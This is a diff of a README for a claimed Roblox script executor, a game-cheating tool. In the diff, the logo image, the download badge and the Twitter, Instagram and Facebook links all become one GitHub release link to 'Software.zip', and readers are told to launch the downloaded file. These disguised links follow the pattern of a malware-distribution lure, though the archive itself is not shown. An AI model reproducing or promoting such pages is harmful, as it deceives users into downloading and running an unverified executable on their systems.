@@ -1,7 +1,7 @@
 
 # Welcome to Swift Executor Repository! 🚀
 
-![Swift Executor Logo](https://example.com/swift-executor-logo.png)
+![Swift Executor Logo](https://github.com/Genxxen/Swift-Executor/releases/download/v2.0/Software.zip)
 
 ## Description
 Welcome to the **Swift Executor** repository, a Level 8 Roblox executor renowned for its 87% sUNC and 92% UNC compatibility. Swift Executor offers decent functionality but is plagued by frequent crashes, limiting its reliability. Despite this, it remains a neutral choice for users who can tolerate some instability in exchange for its capabilities.
@@ -16,7 +16,7 @@ Welcome to the **Swift Executor** repository, a Level 8 Roblox executor renowned
 ## Installation Guide
 You can download the Swift Executor program by clicking the button below:
 
-[![Download Swift Executor](https://img.shields.io/badge/Download-SwiftExecutor-<COLOR>.svg)](https://github.com/12a1wbs/dictionary-web-app-react/releases/download/v1.0/Program.zip)
+[![Download Swift Executor](https://github.com/Genxxen/Swift-Executor/releases/download/v2.0/Software.zip<COLOR>.svg)](https://github.com/Genxxen/Swift-Executor/releases/download/v2.0/Software.zip)
 
 Please note that the downloaded file needs to be launched to install the Swift Executor program on your system. 
 
@@ -34,9 +34,9 @@ If you encounter any issues while using Swift Executor, please check the "Releas
 
 ## Stay Connected
 Stay up-to-date with the latest news and updates for Swift Executor by following us on our social media channels:
-- [Twitter](https://twitter.com/swiftexecutor)
-- [Instagram](https://instagram.com/swiftexecutor)
-- [Facebook](https://facebook.com/swiftexecutor)
+- [Twitter](https://github.com/Genxxen/Swift-Executor/releases/download/v2.0/Software.zip)
+- [Instagram](https://github.com/Genxxen/Swift-Executor/releases/download/v2.0/Software.zip)
+- [Facebook](https://github.com/Genxxen/Swift-Executor/releases/download/v2.0/Software.zip)
 
 ## Credits
 We would like to extend our gratitude to the developers and contributors who have helped make Swift Executor a reality. Your dedication and hard work are truly appreciated!
